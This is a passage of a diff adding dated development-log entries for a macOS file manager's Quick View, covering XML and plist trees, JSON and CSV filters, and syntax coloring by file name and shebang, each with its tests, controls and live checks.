+  included. 47 core tests.
+- **The app half.** `QuickViewTreeView` (renamed from the JSON tree view) holds any `TreeDocument`, maps a
+  label's kind to `SyntaxTheme`, and titles its first column and the filter's picker by the document:
+  Key and "Keys and Values" for JSON and plists, Name and "Names and Values" for XML.
+  `QuickViewPreviewView+Tree` routes JSON and XML through one `showTree`; a binary plist is read through
+  the XML it converts to. `isXML` takes the family by name (the .NET project and resource files, XAML,
+  Xcode's interface, scheme and workspace files, schemas, stylesheets, feeds, GPX and KML) and then by
+  `public.xml` or the property-list type, less images and pages, since `.svg` and `.xhtml` both claim
+  `public.xml`, and `.config` is declared TOML. `QuickViewDualStyleKind.xml` opens as the tree, is called
+  Tree, and remembers its choice apart (`quickViewXMLStyle`); the notification moved to the styles
+  extension to keep `AppPreferences` under the file-length ceiling. "Names and Values" and "Names" are in
+  all 14 languages, and the palette's Filter command gained xml, plist and names. 8 app tests.
+- **One wart only looking found.** An Android string with an inline placeholder
+  (`Поділитися через додаток <ns1:g id="APPLICATION_NAME">%s</ns1:g>`) lost its sentence from the table,
+  which showed an `ns1:g` column holding `%s`. A record whose text sits beside elements is now its whole
+  content on one line as `#text`, with no column per inline element. 1 core test.
+
+Controls: ten core, of which nine failed the tests aimed at them (attribute whitespace, held text dropped,
+Foundation's trim, a repeated child taking the last, an odd dictionary accepted, attribute-only leaves
+opening, a parent matching its text, a mismatched end tag accepted, references not read); the tenth,
+moving the scan back to the split tag after a cut, was inert because the scan never moves past an
+unfinished token, and the line was deleted (docs/NOTES.md ▸ Testing). The mixed-content rule's control
+failed its test. Eight app controls each failed theirs: SVG not excluded, no XML style kind, the column
+title or the picker not following the document, no binary plist read, the header saying Table for JSON
+only, XML not routed to the tree, and plists read as elements. Validation: both linters, all four CI
+scripts (1,031 keys), 3,583 core tests, and the app suite (1,297 tests, the one pre-existing known
+issue). Live, in the Debug build launched by path with the full-window preview over copies of real files:
+a `.csproj` as a tree under "1 Source · 2 Tree" with its `@` rows and `/Project` in the strip; an XML
+`Info.plist` and a binary preferences plist as keys and values with a Key column; `catalog.xml`
+and an Android `values-uk.xml` as tables headed "2 Table", the second after the fix reading the whole
+placeholder sentence under a filter for `APPLICATION_NAME`; the tree's filter over the `.csproj`
+counting "2 of 408 values" with the matches marked and
+`/Project/ItemGroup[1]/Reference[3]/@Include` in the strip; a `.xib` as a tree; a generated 10 MB log as a
+table with its numeric columns right-aligned and the 4 MB notice; `1` showing the colored source; a
+`key=value` `.props` as text; and an `.svg` still an image.
+
+**Left undone:** a list of like elements below the root as a table; XML namespaces resolved rather than
+shown as written; a DTD's own entities; comments as rows; and the header of a file that fell back to text,
+which still says Tree, as a broken JSON file's already did.
+
+**2026-09-16 (last) — a binary property list previews as colored XML.** Asked for as "can we
+apply the highlight to them too, just like a regular one?", after the entry below left binary plists
+going to Quick Look. The live run there had shown Quick Look drawing one as uncolored XML, and the
+first probe here showed why converting it ourselves costs nothing Quick Look was keeping: a binary
+plist written by Python's `plistlib` with its keys stored `zeta`, `alpha`, `mid` came back from Quick
+Look as `alpha`, `mid`, `zeta`, the order `PropertyListSerialization` and `plutil -convert xml1`
+write too.
+
+- **Core.** `TextPreview.readBinaryPropertyList` (`TextPreview+PropertyList.swift`) reads a file
+  that opens with `bplist`, converts it with `PropertyListSerialization` and returns the XML. A file
+  without the magic costs its first six bytes. The whole file has to be read (a binary plist's
+  offset table is at the end), so a file or its XML over `TextPreview.byteLimit` is refused rather
+  than truncated. Measured over the 4 559 binary plists in `~/Library/Preferences`,
+  `~/Library/Application Support`, `~/Library/Containers` and `~/Dev`: all converted, the XML was a
+  median 1.5× and at the 99th percentile 4.4× the file's size, the largest XML was 3.5 MB, and the
+  slowest conversion took 26 ms. The format is checked after parsing as well as the magic before it,
+  because `bplist00 = x;` is a valid old-style plist. 5 core tests.
+- **App.** `TextScan.read` asks for the conversion when `TextPreview.read` refuses a file, and colors
+  the result as markup whatever the name. 1 440 of those 4 559 were compiled `.strings` tables, which
+  the `.strings` grammar their name picks would color as strings and nothing else. It applies to any
+  file the text preview is asked about, so a binary plist with an unclaimed name (`.xcuserstate`,
+  `.sfl4`) previews as XML too. 1 app test added and 1 turned from "falls back to Quick Look" into
+  "previews colored".
+
+Controls: five, each failing the tests aimed at it — reading the whole file before checking the magic
+(the six-bytes test), converting whatever parses (the `bplist00 = x;` case), no limit on the XML (the
+limits test), `TextScan` without the fallback (both app tests), and the converted text colored by name
+(the compiled `.strings` test). The second was inert until that case was added: without it every
+fixture that passed the magic was binary, and the guard looked removable. Validation: both linters,
+3,536 core tests, and the app suite (1,289 tests, the one pre-existing known issue). Live, in the
+Debug build: the unsorted plist, the Finder's preferences file and Sparkle's compiled German
+`.strings` each drew as colored XML.
+
+**2026-09-16 (later) — `.gitignore`, nginx, `.plist`, Dockerfile variants and other development
+files are colored.** Asked for as "can we colorize .gitignore, nginx.conf, .plist, dockerfile in
+preview if there are not? you can also add some useful files for development". Probed first: a
+`Dockerfile` was already colored, but `dockerfile.dev` and `Dockerfile.blackwell` (both under `~/Dev`)
+were not; `.gitignore` had no grammar; `nginx.conf` took the INI row, which colors `on` and a `;` and
+not one directive; and a `.plist` never reached the text preview at all, because
+`com.apple.property-list` is neither `public.text` nor an unclaimed type. A survey of every text file
+under `~/Dev` that no route claimed chose the rest: `.csproj` (80), `.gitignore` (55), `.config` (29,
+28 of them XML), `.cshtml` (29), `.dockerignore` (15), `.bat` (14), `.env` (14, plus `.env.*`),
+`.xcconfig` (10), `.strings` (9), `.xaml` (7), `.babelrc`, `Package.resolved`, `.ps1`.
+
+- **Core, routing.** The name tables moved to `SyntaxLanguage+Names.swift` and gained a third one,
+  **name prefixes** (`dockerfile.`, `containerfile.`, `.env.`), asked after the whole name and the
+  extension, so `Dockerfile.dockerignore` stays an ignore file. New names and extensions on existing
+  rows: the .NET, Razor, Xcode and Vue/Svelte XML families as markup; `.uplugin`, `.uproject`,
+  `.code-workspace`, `Package.resolved`, `.babelrc`, `.eslintrc`, `.prettierrc` and friends as JSON;
+  `Podfile.lock`, `pubspec.lock` and `.clang-format` as YAML; `Cargo.lock`, `poetry.lock`, `uv.lock`
+  and `Pipfile` as TOML; fastlane's and Vagrant's Ruby files; `.envrc` and the zsh/bash login files
+  as shell; `.gitmodules` and three Python tool rc files as INI; `.mdc` as Markdown; `.swiftinterface`;
+  `.metal` as C++. `forFile(named:text:)` moved to `SyntaxLanguage+Contents.swift` and asks the
+  contents in two cases: when the name claims nothing (after the `#!` line), and when it claims INI,
+  which is a family. An `<?xml` opening is markup, and nginx's shape — one of its block names opening
+  a block, plus a statement ending in `;` — is nginx. Over the 89 `.conf` files in `/etc`,
+  `/opt/homebrew/etc` and `~/Dev` that picked out exactly the 9 nginx files and the 23 fontconfig XML
+  ones; `racoon.conf`, with 30 `;` lines and 6 blocks of its own, stayed INI.
+- **Core, four scanners' worth of new languages.** `SyntaxNginxScanner` colors the first word of a
+  statement as the directive, which a keyword list cannot (`index` is a directive and a file name on
+  one line, `http` a block name and every upstream's scheme); variables are `.typeOrTag`, numbers and
+  strings as usual. `SyntaxDotenvScanner` colors `KEY=value` as keyword and string, with quoted values
+  allowed across lines only when the quote opens the value. `SyntaxIgnoreScanner` has two dialects:
+  ignore files (a `#` or `!` means something only as a line's first character; glob metacharacters are
+  keywords) and `.gitattributes`/`CODEOWNERS` (a pattern, then attributes or owners, and `=value`
+  strings). `ToolingGrammars` adds four grammar rows: `.xcconfig` (no block comment, since
+  `$(SRCROOT)/**` would open one), `.strings`, batch (`REM` spelled out, since comment tokens match
+  exactly) and PowerShell (`<# #>`, here-strings, backtick escapes, `$variables`; `pwsh` joins the
+  `#!` interpreters). 26 core tests.
+- **App.** `QuickViewPreviewView.isText` takes a property list. Only `.plist`, `.stringsdict`,
+  `.entitlements` and `.xcprivacy` conform (`.webloc` and its siblings do not). An XML plist shows
+  colored; a binary one is refused by `TextPreview` on its NULs and goes to Quick Look, whose
+  `Text.qlgenerator` shows it converted to XML with sorted keys, as before. 4 app tests.
+
+Controls: eight, each failing the tests aimed at it — every nginx word a directive (the five nginx
+scanner tests), `#` a comment anywhere in an ignore file, `#` ending any `.env` value, prefixes asked
+before the extension, the INI family not refined by contents (the `default.conf` and fontconfig
+cases), any block name counting as nginx's (`racoon.conf`), no line limit on the nginx sniff, and
+`isText` without the property-list line (all three plist app tests). Validation: both linters, all four
+CI scripts, 3,531 core tests, and the app suite (1,288 tests, the one pre-existing known issue). The
+first full app run failed three archive tests after 33–51 s each (`ArchiveNameEncodingCallSiteTests`,
+`ArchiveNameEncodingGestureTests`, `ArchiveWatchReachTests`); those three suites passed alone (28 tests,
+4 s) and the next full run was green. Live, in the Debug build launched by path with Quick View on over
+real files copied from `~/Dev`: `nginx.conf`, `default.conf`, `.gitignore`, `Info.plist`, `.env`,
+`dockerfile.prod`, `run.bat`, `stop-cuda.ps1`, `App.csproj`, `Localizable.strings` and `.gitattributes`
+each drew in their colors, and a binary `.plist` fell back to Quick Look. **Left undone:** showing a
+binary plist as colored XML; a `key=value` scanner for INI (sections and keys stay one color); the
+`.sln` format, `.pbxproj`, `yarn.lock` and `go.mod`; a prose word in a batch `echo` (`not`) or a
+Dockerfile's `npm run` still colors as a keyword.
+
+**2026-09-16 — a script with no extension is colored by its `#!` line.** Asked for as "color
+extensionless scripts by their shebang", one of the items the entry below left undone.
+`SyntaxLanguage.forFile(named:text:)` (core) routes by name first, exactly as before, and reads the
+file's first line only when the name claims nothing; `TextScan.read` is its one caller. So `gradlew`,
+`bin/rails` and a `deploy` script now color, and so would a `notes.txt` that opens with `#!/bin/sh`,
+since the rule is "the name claims nothing" rather than "the name has no extension".
+
+A survey of about 3 000 `#!` lines on this Mac shaped the parser. Most name the interpreter by path
+(`#!/bin/sh`, `#! /bin/zsh`, `#!/usr/bin/perl -w`, a virtual environment's `.venv312/bin/python3`).
+About four in ten put `env` in front (`env node`, `env -S ruby`, `env node --harmony`, `env uv run`),
+and `xcrun` turned out to be a launcher too (`#!/usr/bin/xcrun swift` on 13 files, `xcrun python3`
+on 5), so both are stepped over along with their options, the value an option takes, `--` and
+`env`'s `NAME=value`. A version on the name is dropped (`python3.14`, `ksh93`, `perl5.30`). `sh`,
+`bash`, `zsh`, `ksh`, `mksh` and `dash` color as shell; `python`, `pypy`, `vpython` and `uv` as
+Python; `node`, `nodejs` and `zx` as JavaScript; `perl`, `ruby`, `swift` and `php` as themselves.
+`dtrace`, `pwsh`, `coffee` and `csh` have no grammar here and stay one color. Nothing may precede
+the `#!`, as for the kernel, and the first line is read no further than 1 024 characters, so a 4 MB
+file that opens with `#!` and no line break is not walked. 8 core tests, 1 app test.
+
+Controls: five, each failing the tests aimed at it — launchers not skipped (the four tests with an
+`env` or `xcrun` line), versions not stripped (every test with a versioned name, `python3`
+included), the `#!` line asked before the name (the name-first test), no length cap (the
+unbroken-line test), and `TextScan` routing by name alone (the app test, with the suite's other five
+green). Validation: both linters, all four CI scripts, 3,505 core tests, and the app suite (1,284
+tests, 1,203 executed with the live-server suites skipped, the one pre-existing known issue). Live, in
+the Debug build launched by path, with Quick View on over eight extensionless fixtures: `env bash`,
+`env -S ruby`, `env python3`, `xcrun swift`, `perl -w` and `env node` each drew in their language's
+colors, while `dtrace -s` and a plain `VERSION` stayed one color. **Left undone:** `deno`, `bun`,
+`ts-node` and `make -f`, which no script on this Mac used.
+
+**2026-09-15 (after the filter marks) — files no type claims preview as text.** Asked for as "can we
+treat text files as text files and display their content in the preview?", over a screenshot of
+Quick View drawing a question-mark document for this repo's `VERSION`. `LICENSE` beside it previewed
+fine, and a probe said why: LaunchServices knows `LICENSE`, `README`, `COPYING` and `AUTHORS` by name,
+and nothing else. `VERSION`, `NOTICE`, `Dockerfile` and every dotfile resolve to bare `public.data`, a
+name with an extension nothing declares (`.conf`, `.env`, `.lock`, `.vue`, `.dart`) to a dynamic type
+conforming to nothing, and a script with its execute bit set to `public.unix-executable`. `isText`
+refused all three. A survey of the ~46 000 such files on this Mac found 11 687 text and 34 399 binary,
+with a binary's first NUL at byte 9 in the median case and past 8 KiB in only 3 (docs/NOTES.md ▸
+AppKit, beside the JSON family).
+
+- **`TextPreview` (core)** reads the first 8 KiB on their own and stops there for a binary. The
+  refusal is `decode`'s own NUL rule applied early, on the bytes `decode` would get, and never for a
+  file opening with a byte-order mark, so it can only refuse what the decode would. The same probe
+  found `FileHandle.read(upToCount:)` answering `nil` rather than empty data at the end of a file, so
+  an **empty** file had been refused since the text preview existed; it now reads as empty text. 6
+  tests, one reading the handle's offset after a binary to see the read stopped at 8 KiB.
+- **The app half.** `QuickViewPreviewView.isUnclaimed` is the three shapes above, asked last in
+  `show`, after every backend a declared type could want; a declared type that is not text (a
+  certificate, a VLC module) keeps Quick Look. Such a file goes through `showText`, which falls back
+  to Quick Look for a binary as it always has, and refuses a cloud placeholder unread: Quick Look drew
+  those as an icon, and the text read would download one because the cursor passed over it. 5 tests.
+
+Controls: four, each failing only the tests aimed at it — the sniff removed (the offset test), the
+empty read returning `nil` again, the sniff checking past the byte limit (a NUL one byte beyond it),
+and the route removed (both end-to-end tests, with the three predicate tests staying green).
+Validation: both linters, all four CI scripts, 3,497 core tests, and the app suite (1,283 tests,
+1,202 executed with the live-server suites skipped, the one pre-existing known issue).
+
+Confirmed by hand afterwards, in the running app. **Left undone:** the placeholder refusal, which no
+test can reach because the kernel drops an `SF_DATALESS` set by `chflags`; a placeholder `.txt`, which the text preview still reads, as it did before; `go.mod`, which
+VLC declares as `org.videolan.mod`; and coloring an extensionless script by its `#!` line.
+
+**2026-09-15 (last) — the table and the tree mark what the filter matched.** Asked for as "let's
+highlight the matched text too", with two choices settled first: the marks go in the JSON tree's rows
+and in the CSV table's, a JSON file of records included, and not in the strip; and they are the
+system's find yellow with black text on it.
+
+- **`FilterQuery` (core)** is the query read the one way both filters read it, and where it lies in a
+  text. A probe settled its two branches before any Swift. The filters' `text.lowercased().contains`
+  is the standard library's, which compares whole characters, not Foundation's: half a flag is not
+  found in a flag, where `NSString.range(of:)` finds it. An ASCII query is folded a byte at a time
+  instead, so `e` is found inside a decomposed `é`. Lowercasing kept the character count on every
+  sample tried (`İ` becomes two scalars and stays one character), so a match found in the lowercased
+  text maps back by characters (docs/NOTES.md ▸ Design lessons). Both filters now build their query
+  through it, and a JSON key or string written with an escape is folded like one without: it used to
+  be lowercased, so `k` found the Kelvin sign only where the file escaped it. 7 tests, one of them
+  holding the marks to the rows and values each filter really keeps, over texts where the branches
+  part.
+- **The app half.** `QuickViewTableCell.show` takes the query and the part of the value the filter
+  read — a key, a number or a word whole, a string inside its quotes, never an index or a count — and
+  marks each occurrence within its first 1,000 characters, counted in UTF-16 after line breaks are
+  drawn as spaces. A second probe decided how: in a cell on a selected row, text carrying
+  `.foregroundColor: labelColor` stays dark on the blue, while text with no color attribute takes the
+  label's own color and turns white, so only a marked run carries colors (docs/NOTES.md ▸ AppKit). The
+  tree marks a value only where it matched itself, in the columns the picker reads; the table marks the
+  column picked, or all of them. What is marked is the query the rows on screen came from rather than
+  the text in the field, and clearing takes the marks away. 9 tests.
+
+Controls: ten, each failing the tests aimed at it — the quotes not left out (two tests), the picker
+ignored in the tree, the picked column ignored in the table, marks counted in characters rather than
+UTF-16, no length limit, the unmarked text given its color, clearing the table keeping its marks,
+ASCII marks overlapping, marks found without lowercasing (which also broke the agreement with both
+filters), and an escaped string lowercased again. Validation: both linters, all four CI scripts (the
+localization check finds all 1,029 keys), 3,491 core tests, and the app suite (1,278 tests, 1,163
+executed with the live-server suites skipped, one pre-existing known issue). Live, in the Debug build
+launched by path: `es20` marked `ES20` in both `"ES2020"` values of a `tsconfig.app.json` tree and
+left the quotes alone; `lib` marked the key `lib` on the selected row and `Lib` inside `skipLibCheck`;
+`OK` marked the responseMessage cell of the 2,701 rows a 3,000-row JMeter log kept; and `44` marked
+inside the right-aligned timeStamp and elapsed columns.
+
+Confirmed by hand afterwards: in light mode as well as dark, and on a row selected while the table
+itself has focus, where the rest of the cell turns white around the mark and the selection goes gray
+once the keyboard is back in the field. **Left undone:** marks in the strip, and a match past a cell's first
+1,000 characters.
+
+**2026-09-15 (later yet again) — the JSON tree filters.** Asked for as "add a filter for the json tree", with
+three choices settled first: a matched object or array keeps everything inside it, closed, while the
+way down to each match opens, and clearing gives the tree back as it was; the text searches keys and
+values, with a popup narrowing it to either, case-insensitive as the table's filter is; and ⌥⌘F stays
+one command for the table and the tree, retitled View ▸ Filter in all 14 languages.
+
+- **`JSONDocument.filter(matching:in:isCancelled:)` (core)** answers one byte a value: matched, on the
+  way down to a match, or inside one. It is one pass in document order, since a parent comes before
+  its children: a value under a matched container is marked as inside it, and a match marks its
+  parents until it meets one already marked. A key is searched unless the popup says Values; a string,
+  number, `true`, `false` or `null` is searched as the file writes it unless it says Keys; a container
+  has no text of its own. An ASCII query is matched against the bytes in place with the table filter's
+  A–Z fold, a string holding an escape is decoded first, and any other query decodes and lowercases; a
+  cancellation flag is read every 1,024 values. `children(of:filteredBy:)`,
+  `topLevelValues(filteredBy:)` and `initialExpansion(rowBudget:filteredBy:)` answer which rows a
+  filtered tree lists and opens; the last moved out of `+Records`, so opening a tree is one function
+  with or without a filter. Release build, on the 4.09 MB `Localizable.xcstrings` (91,533 values),
+  the generated file cut at 4 MB (232,006) and a real 60,495-value log: 0.7–4.7 ms for an ASCII
+  query, 54–101 ms for a non-ASCII one, and under 2 ms to work out which rows to open. 11 tests.
+- **The app half.** What the bar does — showing and hiding, Esc, Return and Tab handing the keyboard
+  back, ↑ and ↓ stepping through the rows left — moved out of the table into `QuickViewFilterHost`, a
+  protocol both surfaces adopt, so the tree's own part (`QuickViewJSONTreeView+Filter`) is what it
+  matches and what it shows. The match runs off the main actor and each keystroke cancels the one
+  before. Applying it closes the whole tree, reloads, and opens the way down to the matches while the
+  rows stay within 2,000 (an unfiltered tree opens within 200), in one `beginUpdates`. The rows that
+  were open are recorded first and opened again on clearing, because a reload forgets any open row it
+  hides (docs/NOTES.md ▸ AppKit). The selection stays on a value that still matches and otherwise goes
+  to the first match; cleared, it stays on the value it was on, opened into view. The popup offers
+  "Keys and Values", "Keys" and "Values", and the bar counts "2 of 28 values". Another file puts the bar
+  away. The command keeps its id, `view.quickViewFilterTable`, since the id is its translation key,
+  and gains json, tree, keys and values as keywords; `filterableSurface` answers the table, and
+  otherwise a tree showing a document. Five new strings in all 14 languages, the count with a plural.
+
+Controls: five core reverts failed the tests aimed at them — the inside-a-match rule left out
+(`matchInsideAMatch`), no walk up to the parents (five tests), no case fold (three), escapes read as
+raw bytes (one) and a matched container's contents opened (one). Seven app reverts, each run alone,
+failed theirs: the command not reaching the tree, the popup ignored, a new file keeping the bar,
+clearing not opening the chosen value into view, and the first match not chosen (two tests); the rows
+below the top ignoring the filter failed five. Clearing that forgot the open rows failed the two tests
+that count rows after clearing, and passed the clearing test, where nothing was open to begin with.
+Validation: both linters, all four CI scripts (the localization check finds all 1,029 keys), 3,484
+core tests, and the app suite (1,269 tests, 1,152 executed with the live-server suites skipped, one
+pre-existing known issue). Live,
+in the Debug build launched by path, on a copy of a real `tsconfig.app.json`: ⌥⌘F opened the bar
+focused, the popup on Keys and Values; `ES2020` left `compilerOptions {19}`, `target "ES2020"` and
+`lib [3]` opened to `[0] "ES2020"`, counted "2 of 28 values", with `target` selected and
+`$.compilerOptions.target` in the strip; `lib` left `lib [3]` closed beside `skipLibCheck true`; and
+closing the bar with its button gave the whole tree back with `lib` selected. Confirmed by hand
+afterwards, on JSON files from a search tab: Esc, which the tooling cannot send, clears the text and a
+second puts the bar away; ↑ and ↓ step through the rows left; Return and Tab hand the keyboard back to
+the file list with the filter kept (`inv` leaving 22 of 236 values); deleting the text gives the tree
+back; the popup narrows to Keys or to Values; and on a 4.2 MB file cut at the read limit, `node.sh`
+left 6 of 118,068 values under `attribute_calls [118066…]`.
+
+**Left undone:** searching past
+what was read (a file cut at 4 MB is filtered over its first 4 MB), marking the matched text inside a
+row, and a query as a JSONPath or a pattern.
+
+**2026-09-15 (later yet) — JSON previews as a tree, and a list of records as the CSV table.** Asked for as
+"a table (tree) preview for all types of json files like we have it for csv files". The user picked
+the shape from three options (a tree for every file, with a JSON Lines file or a top-level array of
+objects in the CSV table instead) and the default from three (the tree, remembered apart from the
+CSV table's choice and the pages').
+
+- **The probe decided the parser before any Swift.** The corpus was the 1 487 `.json` and `.jsonl`
+  files in the home folder: 1 418 nested objects; 26 top-level arrays, 11 of them arrays of like
+  objects; 7 of the 8 JSON Lines files lists of like objects; and 78 objects holding such a list one
+  level down. `JSONSerialization` was measured and turned down (docs/NOTES.md ▸ AppKit): it reorders
+  keys, keeps one of two repeated values, reads `1.10` as `1.1`, and does not parse a file cut at the
+  4 MB read limit. Of the 34 files a strict parser refused, 29 were JSONC (`tsconfig.json` and its
+  kin, with comments and trailing commas) and 5 were UTF-16 files `TextPreview` already refuses. And
+  `.jsonl`, `.jsonc`, `.json5`, `.ipynb`, `.har` and `.webmanifest` resolve to dynamic types that
+  conform to nothing, so until now they went to Quick Look.
+- **`JSONDocument` (core)** scans the UTF-8 bytes once with a stack of its own and keeps, per value,
+  where it sits (28 bytes a value, plus 4 a child); a key or a string is decoded when it is shown. It
+  reads JSONC comments and trailing commas, `NaN` and `Infinity`, and several values in a row as
+  several roots. In a file cut at the read limit it closes the open containers, marks them
+  incomplete, and leaves out the value the cut split. Past a million values, or on anything else, the
+  file is shown as text. It writes a value back out indented (the strip, ⌘C) or compact (a table
+  cell), keys and scalars exactly as the file has them, and names a value's JSONPath. In a release
+  build it read the whole corpus in 46 ms, the slowest file in 6 ms, and refused a 4 MB `[0,0,…]` in
+  13 ms. Compared value by value with Python's `json` (with `object_pairs_hook`, which keeps order and
+  repeats), it read the same roots, value counts, top level and table shapes on all 1 480 whole files.
+  - **`recordTable`** makes a `DelimitedTable` from a JSON Lines file or a top-level array of at least
+    two objects, when at least half its cells would be filled: a column per key in the order keys
+    first appear. So the CSV table's sorting, filter, ⌘C and column sizing came with no change. A
+    nested value is its compact JSON, a repeated key takes the last value, a column is numeric when
+    every value in it that is not `null` is a number, and a record the cut split is left out.
+    **`initialExpansion`** opens containers level by level while the rows stay within a budget (200),
+    passing over one too big so its smaller siblings still open.
+  - 36 tests, which found two bugs: `start + byteLimit` trapped where `.max` stood for no limit, and a
+    limit ending inside a character left half of it behind when nothing had to be cut. A third they
+    could not find: the escape test's `é` reached disk as `é` through the agent's file tools, so
+    it passed without reading an escape (docs/NOTES.md ▸ Testing).
+- **The app half.** `QuickViewPreviewView+JSON` routes the family by name — `.json`, `.jsonl`,
+  `.ndjson`, `.jsonc`, `.json5`, `.geojson`, `.topojson`, `.webmanifest`, `.har`, `.ipynb`,
+  `.xcstrings`, `.avsc` and `Package.resolved` — and by `public.json` conformance.
+  `QuickViewJSONTreeView` is an `NSOutlineView` with Key and Value columns: strings quoted, numbers
+  and words in `SyntaxTheme`'s colors, a container as `{3}` or `[12]` with `…` when cut. Its first row
+  is selected as it opens, a double-click opens or closes a row, and under it is the CSV table's strip
+  with the selected value's path and text, its drag handle, and a height remembered apart. It zooms by
+  scaling what it draws, as the table does, with the keep-the-top-row arithmetic now shared
+  (`QuickViewTableScrolling`); the "first 4 MB" notice became a view both use
+  (`QuickViewTruncationNotice`). `QuickViewDualStyleKind.json` opens in the rendered style and follows
+  `quickViewJSONStyle`; the header says "Tree", or "Table" once the file turns out to be records
+  (`captionForHeader`). "Tree", "Key" and "Path" are in all 14 languages, "Tree" taken from each
+  language's own word for the tree view. `AppPreferences` and `QuickViewPreviewView` each moved two
+  functions to an extension file to stay under SwiftLint's ceilings.
+- **One bug only looking found.** The strip drew the second and later lines of a value at its left
+  edge, under the names. Each line of a value is a paragraph of its own, and its style gave those
+  paragraphs no first-line indent (docs/NOTES.md ▸ AppKit). The JSON tree's first container shows it
+  in every file; the CSV strip had it for any quoted cell holding a line break. Every line after the
+  first now takes the value column's indent, and a test reads the paragraph style back.
+
+Controls: four core reverts (a cut record kept, no coverage rule, comments refused, a cut number kept)
+failed exactly the eight tests aimed at them. Seven app reverts each failed only the test aimed at it:
+the tree left out of the hit-test exemptions, the header never saying Table, JSON sharing the table's
+choice, `Package.resolved` not routed by name, the tree not a zoom target, the tree left up under a
+table of records, and the strip's later lines taking the first line's style. Validation: both linters,
+all four CI scripts (the localization check finds all 1 024 keys), 3,473 core tests, and the app suite
+(1,262 tests, 1,181 executed with the live-server suites skipped, one pre-existing known issue). Live,
+in the Debug build launched by path, on copies of real files from this Mac:
+- a `tsconfig.app.json` tree under the header "1 Source · 2 Tree";
+- a 293 KB session log in JSON Lines as a table headed "2 Table", its `durationMs` column
+  right-aligned;
+- the 4.09 MB `Localizable.xcstrings`, just under the 4 MiB limit, with `strings {1381}` left closed;
+- a generated 9.8 MB file showing `items [25778…]` and the notice;
+- a double-click collapsing a row, two zoom steps and a reset, and `1` showing the colored source with
+  `2` going back;
+- the strip's fix, after a relaunch.
+
+**Not verified live:** a real trackpad pinch or pan, ⌘C from a real key press, ⌥-click opening a branch
+whole, a real drag of the strip's edge, and a JSON file on a server or in an archive (both reach the
+same `show(url)` through the local copy). **Left undone:** filtering the tree itself (View ▸ Filter
+Table stays disabled over a tree, and works over a table of records); a list one level down as a
+table; the rest of JSON5; source maps, whose `.map` extension other formats use too; and coloring
+`Package.resolved`'s source, which the grammar table does not name.
+
+**2026-09-15 (later still) — the CSV table filters.** Asked for as "a filter for the table", with three
+choices settled first: one text field searching every column, with a popup narrowing it to one; ⌥⌘F
+showing a bar above the table, with the command also under View ▸ Filter Table and in the palette
+(⌘F was already Favorites); and each new file opening unfiltered.
+
+- **`DelimitedTable.rowsMatching(_:inColumn:isCancelled:)` (core)** answers one `Bool` per data row:
+  a case-insensitive substring match in which accents count, as the pane's own type-to-filter does.
+  The header is not searched. An ASCII query is matched against each cell's bytes in place with A–Z
+  folded, a quoted cell read inside its quotes and only a cell with doubled quotes decoded; any other
+  query decodes each cell and lowercases it. Release build: 1.5–2.8 ms over a million cells for an
+  ASCII query, 132–222 ms at worst for a non-ASCII one. Ignoring diacritics too was measured and
+  passed over: it reads `й` as `и`, and a query found nowhere cost 490 ms against 140.
+  `DelimitedTableRows` composes the sort's permutation with the matches, so a row keeps its number
+  from the file and a sort made while filtered sorts only what is shown. 13 tests, one of them
+  comparing the in-place read with decoding every cell of a fixture full of quotes; four controls (a
+  quoted cell read with its quotes, no case fold, an escaped cell read as raw bytes, rows ignoring the
+  matches) each failed.
+- **The app half (`QuickViewTableFilterBar`, `QuickViewTableView+Filter`).** The match runs off the
+  main actor, and each keystroke cancels the run before it (the core checks a flag every 1,024 rows).
+  `reloadRows`, now shared with sorting, keeps rows somebody chose while they still match, and
+  otherwise puts the automatic selection, and the strip, on the first match. The bar counts "299 of
+  3 000 rows". In the field, Esc clears the text and a second Esc puts the bar away; ↑ and ↓ step
+  through the rows left; Return and Tab hand the keyboard back to the file list with the filter kept.
+  The column code moved to `QuickViewTableView+Columns` to stay under the type-body ceiling.
+- **Every render took the keyboard out of the field.** `restoreTableFocus` runs after each
+  `deliverPreview` in the two full-size modes, and background refreshes re-deliver the preview too.
+  A/B in the Debug build: with the new guard removed, creating and deleting files in the folder moved
+  focus to the file table mid-word, and the rest of the typing went into the pane's type-to-filter,
+  blanking the preview. `QuickViewPreviewView.isTypingInField` is now honoured there, and by the key
+  monitor that takes the arrows back from a focused preview (docs/NOTES.md ▸ AppKit).
+- **One control passed, and the test was at fault.** "A chosen row the filter leaves out gives way to
+  the first match" selected row 0, which a table already has selected when it opens, so no selection
+  change was posted and nothing counted as a choice. It selects row 1 now, and the control fails it.
+
+Tests: 14 core (the 13 above and ⌥⌘F clear of every other shortcut), 15 app in two suites. Controls:
+17, each failing its own tests except removing the generation guard alone, which the cancellation
+covers (removing both fails). Seven strings in all 14 languages, the count with a plural. Validation:
+both linters, the CI scripts (1,021 localization keys), 3,437 core tests and the app suite (1,249
+tests in 204 suites, one pre-existing known issue). Live, on the load-test log (3,000 rows, 17
+columns) in Full Window: ⌥⌘F from a real key press opened the bar focused; `bad req` left 299 rows
+numbered 9, 10, 11, 22…; files created and deleted in the folder while typing left the keyboard in
+the field; ↓ stepped through the matches, ← moved the caret, and `1` went into the text rather than
+switching to Source; Return gave the keyboard back with the filter kept, and the next file opened with
+the bar away. On a CSV with Cyrillic names `ИВАН` found one row, and View ▸ Filter Table is disabled
+on a text file. Esc could not be sent by the tooling (docs/NOTES.md ▸ Live verification); confirmed
+by hand, clearing the text and then putting the bar away.
+
+**2026-09-15 (later again) — the strip under the CSV table can be dragged taller or shorter.** Asked for
+with a screenshot of the strip. A 12-point handle from the strip's separator down
+(`QuickViewStripHandle`) takes the drag, and a double-click on it puts the strip back to fitting the
+selected row. A dragged height holds for every row and file, in all three Quick View sizes and
+across launches, kept in points under `Dirnex.quickView.tableStripHeight` because what the strip
+fits is lines of text; the table keeps 80 points for its header and a couple of rows, and the strip
+one line (`QuickViewTableView+StripHeight`). An NSSplitView was passed over because the strip sizes
+itself until somebody drags it. The store is handed to the surface (`tableLayoutDefaults`), and the
+table fixture gives every table test a scratch domain, so no test reads or writes the running app's
+height. Six tests, driven through the handle's own mouse handlers; five controls (the dragged height
+ignored, no bound, a double-click that forgets nothing, the handle left up with no row, the drag's
+sign flipped) each failed the suite. App suite 1,234, core 3,423. Live in the Debug build: a
+background drag moved the edge where it was dragged and wrote 390, selecting another row kept the
+height, Full Window opened at the same height, and a double-click cleared the key. The resize cursor
+could not be seen in a screenshot, and it was the part that was wrong: laid over the strip's text
+view, the handle showed its cursor only along the one-point separator, because a text view claims
+the I-beam across its whole frame (a probe found cursor rects, a cursor-update tracking area and
